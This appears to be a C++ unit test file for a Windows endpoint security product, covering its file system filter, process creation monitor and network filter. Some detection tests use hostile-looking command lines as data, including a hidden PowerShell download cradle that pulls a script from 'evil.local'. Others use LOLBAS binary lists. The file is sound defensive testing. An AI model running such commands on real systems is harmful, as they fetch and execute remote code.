TEST(FilterRuleCopy, CopyConstruct_PreservesAtomicFields) {
    RT::FilterRule src = MakeNetworkRule("rule-copy-001");
    src.hitCount.store(42u, std::memory_order_relaxed);
    src.lastHitNs.store(9999LL, std::memory_order_relaxed);

    const RT::FilterRule dst(src);
    EXPECT_EQ(42u,   dst.hitCount.load(std::memory_order_relaxed));
    EXPECT_EQ(9999LL, dst.lastHitNs.load(std::memory_order_relaxed));
    EXPECT_EQ(src.ruleId,  dst.ruleId);
    EXPECT_EQ(src.action,  dst.action);
    EXPECT_EQ(src.enabled, dst.enabled);
}

TEST(FilterRuleCopy, AssignOperator_PreservesAtomicFields) {
    RT::FilterRule src = MakeNetworkRule("rule-assign-001");
    src.hitCount.store(77u, std::memory_order_relaxed);

    RT::FilterRule dst = MakeNetworkRule("rule-assign-002");
    dst = src;
    EXPECT_EQ(77u, dst.hitCount.load(std::memory_order_relaxed));
    EXPECT_EQ("rule-assign-001", dst.ruleId);
}

TEST(FilterRuleCopy, MoveConstruct_NoCrash) {
    RT::FilterRule src = MakeNetworkRule("rule-move-001");
    src.hitCount.store(55u, std::memory_order_relaxed);

    RT::FilterRule dst(std::move(src));
    // After move, dst must hold the original ruleId; no crash.
    EXPECT_EQ("rule-move-001", dst.ruleId);
}

TEST(FilterRuleCopy, DefaultConstruct_ZeroAtomics) {
    RT::FilterRule r{};
    EXPECT_EQ(0u, r.hitCount.load(std::memory_order_relaxed));
    EXPECT_EQ(0LL, r.lastHitNs.load(std::memory_order_relaxed));
}

// ============================================================================
// GROUP 9 — Stats Reset Contracts
// ============================================================================

TEST(StatsReset, ProcessMonitorStats_ResetClearsAllFields) {
    RT::ProcessMonitorStats s{};
    s.totalProcessCreations  = 100;
    s.processesBlocked       = 50;
    s.processesAllowed       = 50;
    s.processesSuspicious    = 10;
    s.scanTimeouts           = 2;
    s.lolbasDetections       = 3;

    s.Reset();

    EXPECT_EQ(0u, s.totalProcessCreations);
    EXPECT_EQ(0u, s.processesBlocked);
    EXPECT_EQ(0u, s.processesAllowed);
    EXPECT_EQ(0u, s.processesSuspicious);
    EXPECT_EQ(0u, s.scanTimeouts);
    EXPECT_EQ(0u, s.lolbasDetections);
}

TEST(StatsReset, ProcessMonitorStats_IsCopyable) {
    RT::ProcessMonitorStats s{};
    s.totalProcessCreations = 7;
    s.processesBlocked      = 3;

    const RT::ProcessMonitorStats copy = s;
    EXPECT_EQ(7u, copy.totalProcessCreations);
    EXPECT_EQ(3u, copy.processesBlocked);
}

TEST(StatsReset, NetworkFilterStats_IsCopyable) {
    RT::NetworkFilterStats s{};
    s.connectionsAllowed = 100;
    s.connectionsBlocked = 25;

    const RT::NetworkFilterStats copy = s;
    EXPECT_EQ(100u, copy.connectionsAllowed);
    EXPECT_EQ(25u,  copy.connectionsBlocked);
}

// ============================================================================
// GROUP 10 — FileSystemFilter Lifecycle & Config
// ============================================================================

class FSFLifecycleFixture : public ::testing::Test {
public:
    static void SetUpTestSuite()    { RT::FileSystemFilter::Instance().Initialize(); }
    static void TearDownTestSuite() { RT::FileSystemFilter::Instance().Shutdown();   }

    void TearDown() override {
        RT::FileSystemFilter::Instance().ClearExclusions();
        RT::FileSystemFilter::Instance().ResetStats();
    }
};

TEST_F(FSFLifecycleFixture, Initialize_DoesNotCrash) {
    // Already called in SetUpTestSuite; additional call must be idempotent.
    RT::FileSystemFilter::Instance().Initialize();
    SUCCEED();
}

TEST_F(FSFLifecycleFixture, GetStatus_NotRunning_WithoutDriver) {
    const RT::FilterStatus st = RT::FileSystemFilter::Instance().GetStatus();
    // Without the minifilter driver, status must NOT be Running.
    EXPECT_NE(RT::FilterStatus::Running, st);
}

TEST_F(FSFLifecycleFixture, IsInitialized_TrueAfterInit) {
    EXPECT_TRUE(RT::FileSystemFilter::Instance().IsInitialized());
}

TEST_F(FSFLifecycleFixture, UpdateConfig_RoundTrip_ScanOnWrite) {
    RT::FileSystemFilterConfig cfg = RT::FileSystemFilterConfig::CreateDefault();
    cfg.scanOnWrite = true;
    RT::FileSystemFilter::Instance().UpdateConfig(cfg);

    const RT::FileSystemFilterConfig got = RT::FileSystemFilter::Instance().GetConfig();
    EXPECT_TRUE(got.scanOnWrite);

    // Restore default
    RT::FileSystemFilter::Instance().UpdateConfig(
        RT::FileSystemFilterConfig::CreateDefault());
}

TEST_F(FSFLifecycleFixture, UpdateConfig_RoundTrip_ScanTimeout) {
    RT::FileSystemFilterConfig cfg = RT::FileSystemFilterConfig::CreateDefault();
    cfg.scanTimeoutMs = 12345u;
    RT::FileSystemFilter::Instance().UpdateConfig(cfg);

    const RT::FileSystemFilterConfig got = RT::FileSystemFilter::Instance().GetConfig();
    EXPECT_EQ(12345u, got.scanTimeoutMs);
}

TEST_F(FSFLifecycleFixture, SetScanOnWrite_Persists) {
    RT::FileSystemFilter::Instance().SetScanOnWrite(true);
    EXPECT_TRUE(RT::FileSystemFilter::Instance().GetConfig().scanOnWrite);
    RT::FileSystemFilter::Instance().SetScanOnWrite(false);
    EXPECT_FALSE(RT::FileSystemFilter::Instance().GetConfig().scanOnWrite);
}

TEST_F(FSFLifecycleFixture, SetScanTimeout_Persists) {
    RT::FileSystemFilter::Instance().SetScanTimeout(8888u);
    EXPECT_EQ(8888u, RT::FileSystemFilter::Instance().GetConfig().scanTimeoutMs);
}

TEST_F(FSFLifecycleFixture, Stop_Idempotent_NoCrash) {
    RT::FileSystemFilter::Instance().Stop();
    RT::FileSystemFilter::Instance().Stop();
    SUCCEED();
}

TEST_F(FSFLifecycleFixture, IsDriverInstalled_ReturnsBool_NoCrash) {
    // Must return without crash; value depends on environment.
    [[maybe_unused]] const bool installed =
        RT::FileSystemFilter::Instance().IsDriverInstalled();
    SUCCEED();
}

TEST_F(FSFLifecycleFixture, GetCacheHitRate_ZeroBeforeScans) {
    RT::FileSystemFilter::Instance().ResetStats();
    const double rate = RT::FileSystemFilter::Instance().GetCacheHitRate();
    EXPECT_GE(rate, 0.0);
    EXPECT_LE(rate, 1.0);
}

// ============================================================================
// GROUP 11 — FileSystemFilter Exclusion Management
// ============================================================================

TEST_F(FSFLifecycleFixture, AddExclusion_PathType_ReflectedInGetExclusions) {
    RT::FilterExclusion exc{};
    exc.type    = RT::FilterExclusion::Type::Path;
    exc.pattern = L"C:\\TestExcluded";
    EXPECT_TRUE(RT::FileSystemFilter::Instance().AddExclusion(exc));

    const auto all = RT::FileSystemFilter::Instance().GetExclusions();
    EXPECT_FALSE(all.empty());
    RT::FileSystemFilter::Instance().ClearExclusions();
}

TEST_F(FSFLifecycleFixture, IsPathExcluded_AfterAdd_ReturnsTrue) {
    RT::FilterExclusion exc{};
    exc.type    = RT::FilterExclusion::Type::Path;
    exc.pattern = L"C:\\ShadowStrikeTestPath";
    RT::FileSystemFilter::Instance().AddExclusion(exc);

    EXPECT_TRUE(
        RT::FileSystemFilter::Instance().IsPathExcluded(L"C:\\ShadowStrikeTestPath"));
    RT::FileSystemFilter::Instance().ClearExclusions();
}

TEST_F(FSFLifecycleFixture, IsPathExcluded_UnknownPath_ReturnsFalse) {
    EXPECT_FALSE(
        RT::FileSystemFilter::Instance().IsPathExcluded(L"C:\\NotExcluded\\file.exe"));
}

TEST_F(FSFLifecycleFixture, AddExclusion_Extension_IsProcessExcluded_NoCrash) {
    RT::FilterExclusion exc{};
    exc.type    = RT::FilterExclusion::Type::Extension;
    exc.pattern = L".log";
    RT::FileSystemFilter::Instance().AddExclusion(exc);
    // Extension exclusions don't affect IsProcessExcluded; verify no crash.
    EXPECT_FALSE(
        RT::FileSystemFilter::Instance().IsProcessExcluded(L"someprocess.exe"));
    RT::FileSystemFilter::Instance().ClearExclusions();
}

TEST_F(FSFLifecycleFixture, RemoveExclusion_ByPattern_RemovesEntry) {
    RT::FilterExclusion exc{};
    exc.type    = RT::FilterExclusion::Type::Path;
    exc.pattern = L"C:\\RemovableTestPath";
    RT::FileSystemFilter::Instance().AddExclusion(exc);
    EXPECT_TRUE(RT::FileSystemFilter::Instance().RemoveExclusion(L"C:\\RemovableTestPath"));

    EXPECT_FALSE(
        RT::FileSystemFilter::Instance().IsPathExcluded(L"C:\\RemovableTestPath"));
}

TEST_F(FSFLifecycleFixture, ClearExclusions_EmptiesAll) {
    RT::FilterExclusion exc{};
    exc.type    = RT::FilterExclusion::Type::Path;
    exc.pattern = L"C:\\PathA";
    RT::FileSystemFilter::Instance().AddExclusion(exc);
    exc.pattern = L"C:\\PathB";
    RT::FileSystemFilter::Instance().AddExclusion(exc);

    RT::FileSystemFilter::Instance().ClearExclusions();
    EXPECT_TRUE(RT::FileSystemFilter::Instance().GetExclusions().empty());
}

TEST_F(FSFLifecycleFixture, AddExclusion_Duplicate_DoesNotCrash) {
    RT::FilterExclusion exc{};
    exc.type    = RT::FilterExclusion::Type::Path;
    exc.pattern = L"C:\\DuplicatePath";
    RT::FileSystemFilter::Instance().AddExclusion(exc);
    RT::FileSystemFilter::Instance().AddExclusion(exc);  // second add must not crash
    RT::FileSystemFilter::Instance().ClearExclusions();
    SUCCEED();
}

// ============================================================================
// GROUP 12 — FileSystemFilter Stats & Cache
// ============================================================================

TEST_F(FSFLifecycleFixture, GetStats_ReturnsCopyableStruct) {
    const RT::FileSystemFilterStats s = RT::FileSystemFilter::Instance().GetStats();
    EXPECT_GE(s.totalScanRequests, 0u);
}

TEST_F(FSFLifecycleFixture, ResetStats_ZerosFields) {
    RT::FileSystemFilter::Instance().ResetStats();
    const RT::FileSystemFilterStats s = RT::FileSystemFilter::Instance().GetStats();
    EXPECT_EQ(0u, s.totalScanRequests);
    EXPECT_EQ(0u, s.filesBlocked);
    EXPECT_EQ(0u, s.cacheHits);
}

TEST_F(FSFLifecycleFixture, FlushCache_NoCrash) {
    RT::FileSystemFilter::Instance().FlushCache();
    SUCCEED();
}

TEST_F(FSFLifecycleFixture, InvalidateCacheEntry_NonExistentPath_NoCrash) {
    RT::FileSystemFilter::Instance().InvalidateCacheEntry(L"C:\\DoesNotExist.exe");
    SUCCEED();
}

TEST_F(FSFLifecycleFixture, InvalidateCacheEntryByHash_NoCrash) {
    RT::FileSystemFilter::Instance().InvalidateCacheEntryByHash(
        "0000000000000000000000000000000000000000000000000000000000000000");
    SUCCEED();
}

TEST_F(FSFLifecycleFixture, RegisterNotificationCallback_ReturnsNonZeroId) {
    uint64_t id = RT::FileSystemFilter::Instance().RegisterNotificationCallback(
        [](const RT::FileAccessEvent&) {});
    EXPECT_NE(0u, id);
    RT::FileSystemFilter::Instance().UnregisterNotificationCallback(id);
}

TEST_F(FSFLifecycleFixture, UnregisterNotificationCallback_InvalidId_ReturnsFalse) {
    EXPECT_FALSE(
        RT::FileSystemFilter::Instance().UnregisterNotificationCallback(0u));
    EXPECT_FALSE(
        RT::FileSystemFilter::Instance().UnregisterNotificationCallback(
            std::numeric_limits<uint64_t>::max()));
}

TEST_F(FSFLifecycleFixture, RegisterStatusCallback_ReturnsNonZeroId) {
    uint64_t id = RT::FileSystemFilter::Instance().RegisterStatusCallback(
        [](RT::FilterStatus, const std::wstring&) {});
    EXPECT_NE(0u, id);
    RT::FileSystemFilter::Instance().UnregisterStatusCallback(id);
}

TEST_F(FSFLifecycleFixture, RegisterThreatCallback_ReturnsNonZeroId) {
    uint64_t id = RT::FileSystemFilter::Instance().RegisterThreatCallback(
        [](const RT::FileAccessEvent&, const std::wstring&, double) {});
    EXPECT_NE(0u, id);
    RT::FileSystemFilter::Instance().UnregisterThreatCallback(id);
}

// ============================================================================
// GROUP 13 — ProcessCreationMonitor Lifecycle & Config
// ============================================================================

class PCMFixture : public ::testing::Test {
public:
    static void SetUpTestSuite()    { RT::ProcessCreationMonitor::Instance().Initialize(); }
    static void TearDownTestSuite() { RT::ProcessCreationMonitor::Instance().Shutdown();   }

    void TearDown() override {
        RT::ProcessCreationMonitor::Instance().ResetStats();
    }
};

TEST_F(PCMFixture, Initialize_Idempotent_NoCrash) {
    EXPECT_TRUE(RT::ProcessCreationMonitor::Instance().Initialize());
    SUCCEED();
}

TEST_F(PCMFixture, GetConfig_ReturnsDefault_WhenNoUpdate) {
    const RT::ProcessMonitorConfig cfg =
        RT::ProcessCreationMonitor::Instance().GetConfig();
    EXPECT_TRUE(cfg.enabled);
}

TEST_F(PCMFixture, UpdateConfig_RoundTrip_AlertThreshold) {
    RT::ProcessMonitorConfig cfg = RT::ProcessMonitorConfig::CreateDefault();
    cfg.alertThreshold = 37.5;
    RT::ProcessCreationMonitor::Instance().UpdateConfig(cfg);

    const RT::ProcessMonitorConfig got =
        RT::ProcessCreationMonitor::Instance().GetConfig();
    EXPECT_DOUBLE_EQ(37.5, got.alertThreshold);

    RT::ProcessCreationMonitor::Instance().UpdateConfig(
        RT::ProcessMonitorConfig::CreateDefault());
}

TEST_F(PCMFixture, UpdateConfig_Strict_Persists) {
    const RT::ProcessMonitorConfig strict = RT::ProcessMonitorConfig::CreateStrict();
    RT::ProcessCreationMonitor::Instance().UpdateConfig(strict);
    const RT::ProcessMonitorConfig got =
        RT::ProcessCreationMonitor::Instance().GetConfig();
    EXPECT_TRUE(got.blockUnsigned);
    EXPECT_TRUE(got.blockFromTemp);
    EXPECT_DOUBLE_EQ(30.0, got.alertThreshold);
    RT::ProcessCreationMonitor::Instance().UpdateConfig(
        RT::ProcessMonitorConfig::CreateDefault());
}

TEST_F(PCMFixture, Stop_Idempotent_NoCrash) {
    RT::ProcessCreationMonitor::Instance().Stop();
    RT::ProcessCreationMonitor::Instance().Stop();
    SUCCEED();
}

TEST_F(PCMFixture, Shutdown_Idempotent_NoCrash) {
    // Re-init afterwards to keep the suite functional.
    RT::ProcessCreationMonitor::Instance().Shutdown();
    RT::ProcessCreationMonitor::Instance().Initialize();
    SUCCEED();
}

// ============================================================================
// GROUP 14 — ProcessCreationMonitor LOLBAS Classification
// ============================================================================

TEST_F(PCMFixture, ClassifyLOLBAS_PowerShell_CaseInsensitive) {
    EXPECT_EQ(RT::LOLBASType::PowerShell,
        RT::ProcessCreationMonitor::Instance().ClassifyLOLBAS(L"powershell.exe"));
    EXPECT_EQ(RT::LOLBASType::PowerShell,
        RT::ProcessCreationMonitor::Instance().ClassifyLOLBAS(L"POWERSHELL.EXE"));
    EXPECT_EQ(RT::LOLBASType::PowerShell,
        RT::ProcessCreationMonitor::Instance().ClassifyLOLBAS(L"PowerShell.exe"));
}

TEST_F(PCMFixture, ClassifyLOLBAS_Cmd) {
    EXPECT_EQ(RT::LOLBASType::Cmd,
        RT::ProcessCreationMonitor::Instance().ClassifyLOLBAS(L"cmd.exe"));
}

TEST_F(PCMFixture, ClassifyLOLBAS_Mshta) {
    EXPECT_EQ(RT::LOLBASType::Mshta,
        RT::ProcessCreationMonitor::Instance().ClassifyLOLBAS(L"mshta.exe"));
}

TEST_F(PCMFixture, ClassifyLOLBAS_Regsvr32) {
    EXPECT_EQ(RT::LOLBASType::Regsvr32,
        RT::ProcessCreationMonitor::Instance().ClassifyLOLBAS(L"regsvr32.exe"));
}

TEST_F(PCMFixture, ClassifyLOLBAS_Rundll32) {
    EXPECT_EQ(RT::LOLBASType::Rundll32,
        RT::ProcessCreationMonitor::Instance().ClassifyLOLBAS(L"rundll32.exe"));
}

TEST_F(PCMFixture, ClassifyLOLBAS_Certutil) {
    EXPECT_EQ(RT::LOLBASType::Certutil,
        RT::ProcessCreationMonitor::Instance().ClassifyLOLBAS(L"certutil.exe"));
}

TEST_F(PCMFixture, ClassifyLOLBAS_Bitsadmin) {
    EXPECT_EQ(RT::LOLBASType::Bitsadmin,
        RT::ProcessCreationMonitor::Instance().ClassifyLOLBAS(L"bitsadmin.exe"));
}

TEST_F(PCMFixture, ClassifyLOLBAS_Wmic) {
    EXPECT_EQ(RT::LOLBASType::Wmic,
        RT::ProcessCreationMonitor::Instance().ClassifyLOLBAS(L"wmic.exe"));
}

TEST_F(PCMFixture, ClassifyLOLBAS_Msiexec) {
    EXPECT_EQ(RT::LOLBASType::Msiexec,
        RT::ProcessCreationMonitor::Instance().ClassifyLOLBAS(L"msiexec.exe"));
}

TEST_F(PCMFixture, ClassifyLOLBAS_InstallUtil) {
    EXPECT_EQ(RT::LOLBASType::InstallUtil,
        RT::ProcessCreationMonitor::Instance().ClassifyLOLBAS(L"installutil.exe"));
}

TEST_F(PCMFixture, ClassifyLOLBAS_Notepad_ReturnsNone) {
    EXPECT_EQ(RT::LOLBASType::None,
        RT::ProcessCreationMonitor::Instance().ClassifyLOLBAS(L"notepad.exe"));
}

TEST_F(PCMFixture, ClassifyLOLBAS_EmptyString_ReturnsNone) {
    EXPECT_EQ(RT::LOLBASType::None,
        RT::ProcessCreationMonitor::Instance().ClassifyLOLBAS(L""));
}

TEST_F(PCMFixture, ClassifyLOLBAS_FullPath_RecognisesBinaryName) {
    // Many detections should match on the filename, not the full path.
    EXPECT_EQ(RT::LOLBASType::PowerShell,
        RT::ProcessCreationMonitor::Instance().ClassifyLOLBAS(
            L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"));
}

TEST_F(PCMFixture, LOLBASTypeToString_AllKnownValues_NonEmpty) {
    for (uint8_t v = 0; v <= static_cast<uint8_t>(RT::LOLBASType::WSL); ++v) {
        const std::string s = RT::LOLBASTypeToString(
            static_cast<RT::LOLBASType>(v));
        EXPECT_FALSE(s.empty()) << "LOLBASTypeToString returned empty for value " << +v;
    }
}

TEST_F(PCMFixture, ProcessVerdictToString_AllKnownValues_NonEmpty) {
    for (uint8_t v = 0; v <= static_cast<uint8_t>(RT::ProcessVerdict::Error); ++v) {
        const std::string s = RT::ProcessVerdictToString(
            static_cast<RT::ProcessVerdict>(v));
        EXPECT_FALSE(s.empty()) << "ProcessVerdictToString empty for value " << +v;
    }
}

// ============================================================================
// GROUP 15 — ProcessCreationMonitor Command-Line Analysis
// ============================================================================

TEST_F(PCMFixture, AnalyzeCommandLine_EncodedPowerShell_DetectsEncoding) {
    const RT::CommandLineAnalysis result =
        RT::ProcessCreationMonitor::Instance().AnalyzeCommandLine(
            L"powershell.exe -EncodedCommand "
            L"QQBsAGUAcgB0ACgAJwBIAGUAbABsAG8AJwApAA==");
    EXPECT_TRUE(result.hasEncodedContent);
    EXPECT_GT(result.riskScore, 0.0);
}

TEST_F(PCMFixture, AnalyzeCommandLine_DownloadCradle_DetectsDownload) {
    const RT::CommandLineAnalysis result =
        RT::ProcessCreationMonitor::Instance().AnalyzeCommandLine(
            L"powershell.exe -WindowStyle Hidden -c "
            L"(New-Object Net.WebClient).DownloadString('http://evil.local/pay.ps1')");
    EXPECT_GT(result.riskScore, 0.0);
    // At minimum one suspicious pattern must be flagged.
    EXPECT_FALSE(result.patterns.empty());
}

TEST_F(PCMFixture, AnalyzeCommandLine_Benign_LowRisk) {
    const RT::CommandLineAnalysis result =
        RT::ProcessCreationMonitor::Instance().AnalyzeCommandLine(
            L"notepad.exe C:\\Users\\user\\document.txt");
    // Benign command should not cross the alert threshold.
    EXPECT_LT(result.riskScore,
              RT::ProcessMonitorConstants::ENCODED_COMMAND_SCORE);
    EXPECT_TRUE(result.patterns.empty());
}

TEST_F(PCMFixture, AnalyzeCommandLine_Empty_NoCrash) {
    EXPECT_NO_THROW(
        RT::ProcessCreationMonitor::Instance().AnalyzeCommandLine(L""));
}

TEST_F(PCMFixture, AnalyzeCommandLine_ExecutionPolicyBypass_IsFlagged) {
    const RT::CommandLineAnalysis result =
        RT::ProcessCreationMonitor::Instance().AnalyzeCommandLine(
            L"powershell.exe -ExecutionPolicy Bypass -File C:\\Temp\\script.ps1");
    EXPECT_GT(result.riskScore, 0.0);
}

TEST_F(PCMFixture, IsCommandLineSuspicious_EncodedCommand_ReturnsTrue) {
    EXPECT_TRUE(
        RT::ProcessCreationMonitor::Instance().IsCommandLineSuspicious(
            L"powershell.exe -w hidden -enc "
            L"QQBsAGUAcgB0ACgAJwBoAGkAJwApAA=="));
}

TEST_F(PCMFixture, IsCommandLineSuspicious_NotepadBenign_ReturnsFalse) {
    EXPECT_FALSE(
        RT::ProcessCreationMonitor::Instance().IsCommandLineSuspicious(
            L"notepad.exe"));
}

TEST_F(PCMFixture, DecodeEncodedContent_EmptyString_NoCrash) {
    EXPECT_NO_THROW(
        RT::ProcessCreationMonitor::Instance().DecodeEncodedContent(L""));
}

TEST_F(PCMFixture, SuspiciousPatternToMitre_EncodedCommand_NonEmpty) {
    const std::string mitre = RT::SuspiciousPatternToMitre(
        RT::SuspiciousPattern::ObfuscatedCmdLine);
    EXPECT_FALSE(mitre.empty());
}

TEST_F(PCMFixture, SuspiciousPatternToMitre_ProcessInjection_NonEmpty) {
    const std::string mitre = RT::SuspiciousPatternToMitre(
        RT::SuspiciousPattern::ProcessHollowing);
    EXPECT_FALSE(mitre.empty());
}

// ============================================================================
// GROUP 16 — ProcessCreationMonitor Rule Management
// ============================================================================

TEST_F(PCMFixture, AddRule_ValidId_ReturnsTrue) {
    RT::ProcessPolicyRule r = MakePolicyRule("pcm-rule-001");
    EXPECT_TRUE(RT::ProcessCreationMonitor::Instance().AddRule(r));
    RT::ProcessCreationMonitor::Instance().RemoveRule("pcm-rule-001");
}

TEST_F(PCMFixture, GetRules_ReflectsAddedRule) {
    RT::ProcessPolicyRule r = MakePolicyRule("pcm-rule-002");
    RT::ProcessCreationMonitor::Instance().AddRule(r);

    const auto rules = RT::ProcessCreationMonitor::Instance().GetRules();
    const bool found = std::any_of(rules.begin(), rules.end(),
        [](const RT::ProcessPolicyRule& x){ return x.ruleId == "pcm-rule-002"; });
    EXPECT_TRUE(found);
    RT::ProcessCreationMonitor::Instance().RemoveRule("pcm-rule-002");
}

TEST_F(PCMFixture, RemoveRule_ExistingId_ReturnsTrue) {
    RT::ProcessCreationMonitor::Instance().AddRule(MakePolicyRule("pcm-rule-003"));
    EXPECT_TRUE(RT::ProcessCreationMonitor::Instance().RemoveRule("pcm-rule-003"));
}

TEST_F(PCMFixture, RemoveRule_NonExistentId_ReturnsFalse) {
    EXPECT_FALSE(
        RT::ProcessCreationMonitor::Instance().RemoveRule("no-such-rule-xyz"));
}

TEST_F(PCMFixture, SetRuleEnabled_False_ReflectedInGetRules) {
    RT::ProcessCreationMonitor::Instance().AddRule(MakePolicyRule("pcm-rule-004"));
    RT::ProcessCreationMonitor::Instance().SetRuleEnabled("pcm-rule-004", false);

    const auto rules = RT::ProcessCreationMonitor::Instance().GetRules();
    for (const auto& r : rules) {
        if (r.ruleId == "pcm-rule-004") {
            EXPECT_FALSE(r.enabled);
        }
    }
    RT::ProcessCreationMonitor::Instance().RemoveRule("pcm-rule-004");
}

TEST_F(PCMFixture, AddMultipleRules_GetRules_CountIncreases) {
    const size_t before = RT::ProcessCreationMonitor::Instance().GetRules().size();
    RT::ProcessCreationMonitor::Instance().AddRule(MakePolicyRule("pcm-rule-005"));
    RT::ProcessCreationMonitor::Instance().AddRule(MakePolicyRule("pcm-rule-006"));

    const size_t after = RT::ProcessCreationMonitor::Instance().GetRules().size();
    EXPECT_EQ(before + 2u, after);

    RT::ProcessCreationMonitor::Instance().RemoveRule("pcm-rule-005");
    RT::ProcessCreationMonitor::Instance().RemoveRule("pcm-rule-006");
}

// ============================================================================
// GROUP 17 — ProcessCreationMonitor Process Tracking & Stats
// ============================================================================

TEST_F(PCMFixture, OnProcessCreate_ZeroPid_DoesNotCrash) {
    // A zero-PID request must not crash; verdict must be Error or Allow.
    const RT::ProcessVerdict v =
        RT::ProcessCreationMonitor::Instance().OnProcessCreate(
            0u, L"C:\\Windows\\System32\\svchost.exe", 4u);
    EXPECT_TRUE(v == RT::ProcessVerdict::Error || v == RT::ProcessVerdict::Allow ||
                v == RT::ProcessVerdict::AllowMonitored);
}

TEST_F(PCMFixture, OnProcessCreate_EmptyImagePath_DoesNotCrash) {
    const RT::ProcessVerdict v =
        RT::ProcessCreationMonitor::Instance().OnProcessCreate(
            9999u, L"", 0u);
    EXPECT_TRUE(v == RT::ProcessVerdict::Error || v == RT::ProcessVerdict::Allow ||
                v == RT::ProcessVerdict::AllowMonitored);
}

TEST_F(PCMFixture, OnProcessCreate_ValidExplorer_AllowOrMonitor) {
    const RT::ProcessVerdict v =
        RT::ProcessCreationMonitor::Instance().OnProcessCreate(
            1234u, L"C:\\Windows\\explorer.exe", 4u);
    EXPECT_NE(RT::ProcessVerdict::Block, v);
}

TEST_F(PCMFixture, OnProcessTerminate_UntrackedPid_DoesNotCrash) {
    RT::ProcessCreationMonitor::Instance().OnProcessTerminate(999999u, 0u);
    SUCCEED();
}

TEST_F(PCMFixture, GetProcessInfo_ZeroPid_ReturnsNullopt) {
    EXPECT_FALSE(
        RT::ProcessCreationMonitor::Instance().GetProcessInfo(0u).has_value());
}

TEST_F(PCMFixture, GetProcessInfo_UntrackedPid_ReturnsNullopt) {
    EXPECT_FALSE(
        RT::ProcessCreationMonitor::Instance().GetProcessInfo(0xDEADBEEFu).has_value());
}

TEST_F(PCMFixture, GetAllProcesses_ReturnVector_NoCrash) {
    const auto procs = RT::ProcessCreationMonitor::Instance().GetAllProcesses();
    // May be empty or populated — no crash is the contract.
    EXPECT_GE(procs.size(), 0u);
}

TEST_F(PCMFixture, GetProcessesByImage_Nonexistent_ReturnsEmptyVector) {
    const auto procs =
        RT::ProcessCreationMonitor::Instance().GetProcessesByImage(
            L"nonexistent_binary_zzz.exe");
    EXPECT_TRUE(procs.empty());
}

TEST_F(PCMFixture, GetAncestorChain_UntrackedPid_ReturnsEmptyVector) {
    const auto chain =
        RT::ProcessCreationMonitor::Instance().GetAncestorChain(0xDEADBEEFu);
    EXPECT_TRUE(chain.empty());
}

TEST_F(PCMFixture, GetStats_ReturnsStats_AfterOnProcessCreate) {
    RT::ProcessCreationMonitor::Instance().ResetStats();
    RT::ProcessCreationMonitor::Instance().OnProcessCreate(
        5555u, L"C:\\Windows\\System32\\cmd.exe", 4u);

    const RT::ProcessMonitorStats s =
        RT::ProcessCreationMonitor::Instance().GetStats();
    EXPECT_GE(s.totalProcessCreations, 1u);
}

TEST_F(PCMFixture, ResetStats_ZerosAfterActivity) {
    RT::ProcessCreationMonitor::Instance().OnProcessCreate(
        6666u, L"C:\\Windows\\System32\\cmd.exe", 4u);
    RT::ProcessCreationMonitor::Instance().ResetStats();

    const RT::ProcessMonitorStats s =
        RT::ProcessCreationMonitor::Instance().GetStats();
    EXPECT_EQ(0u, s.totalProcessCreations);
}

// ============================================================================
// GROUP 18 — ProcessCreationMonitor Parent-Child Analysis
// ============================================================================

TEST_F(PCMFixture, CheckParentChild_OfficeSpawnsCmd_DetectsPattern) {
    RT::ProcessInfo parent{}, child{};
    parent.imageName  = L"winword.exe";
    parent.isOfficeApp = true;
    child.imageName   = L"cmd.exe";
    const auto patterns =
        RT::ProcessCreationMonitor::Instance().CheckParentChild(parent, child);
    EXPECT_FALSE(patterns.empty());
}

TEST_F(PCMFixture, CheckParentChild_WmiSpawnsPowerShell_DetectsPattern) {
    RT::ProcessInfo parent{}, child{};
    parent.imageName = L"wmiprvse.exe";
    child.imageName  = L"powershell.exe";
    const auto patterns =
        RT::ProcessCreationMonitor::Instance().CheckParentChild(parent, child);
    EXPECT_FALSE(patterns.empty());
}

TEST_F(PCMFixture, CheckParentChild_ExplorerSpawnsNotepad_ReturnsEmpty) {
    RT::ProcessInfo parent{}, child{};
    parent.imageName = L"explorer.exe";
    child.imageName  = L"notepad.exe";
    const auto patterns =
        RT::ProcessCreationMonitor::Instance().CheckParentChild(parent, child);
    // Explorer launching Notepad is a normal, expected parent-child pair.
    EXPECT_TRUE(patterns.empty());
}

TEST_F(PCMFixture, ClassifyProcessType_SystemPid_ReturnsSystemOrUnknown) {
    RT::ProcessInfo info{};
    info.processId = 4u;
    info.imageName = L"System";
    const RT::ProcessType t =
        RT::ProcessCreationMonitor::Instance().ClassifyProcessType(info);
    EXPECT_TRUE(t == RT::ProcessType::System || t == RT::ProcessType::Unknown);
}

// ============================================================================
// GROUP 19 — NetworkTrafficFilter Lifecycle & Config
// ============================================================================

class NTFFixture : public ::testing::Test {
public:
    static void SetUpTestSuite()    { RT::NetworkTrafficFilter::Instance().Initialize(); }
    static void TearDownTestSuite() { RT::NetworkTrafficFilter::Instance().Shutdown();   }

    void TearDown() override {
        // Clean any blocked IPs/domains added by tests.
        for (const auto& ip : RT::NetworkTrafficFilter::Instance().GetBlockedIPs()) {
            RT::NetworkTrafficFilter::Instance().UnblockIP(ip);
        }
        for (const auto& d : RT::NetworkTrafficFilter::Instance().GetBlockedDomains()) {
            RT::NetworkTrafficFilter::Instance().UnblockDomain(d);
        }
    }
};

TEST_F(NTFFixture, Initialize_Idempotent_NoCrash) {
    RT::NetworkTrafficFilter::Instance().Initialize();
    SUCCEED();
}

TEST_F(NTFFixture, Stop_Idempotent_NoCrash) {
    RT::NetworkTrafficFilter::Instance().Stop();
    RT::NetworkTrafficFilter::Instance().Stop();
    SUCCEED();
}

TEST_F(NTFFixture, UpdateConfig_RoundTrip_DefaultAction) {
    RT::NetworkFilterConfig cfg = RT::NetworkFilterConfig::CreateStrict();
    RT::NetworkTrafficFilter::Instance().UpdateConfig(cfg);

    const RT::NetworkFilterConfig got =
        RT::NetworkTrafficFilter::Instance().GetConfig();
    EXPECT_EQ(RT::FilterAction::Block, got.defaultAction);

    RT::NetworkTrafficFilter::Instance().UpdateConfig(
        RT::NetworkFilterConfig::CreateDefault());
}

TEST_F(NTFFixture, UpdateConfig_MonitorOnly_Persists) {
    RT::NetworkTrafficFilter::Instance().UpdateConfig(
        RT::NetworkFilterConfig::CreateMonitorOnly());
    EXPECT_EQ(RT::FilterAction::LogOnly,
        RT::NetworkTrafficFilter::Instance().GetConfig().defaultAction);
    RT::NetworkTrafficFilter::Instance().UpdateConfig(
        RT::NetworkFilterConfig::CreateDefault());
}

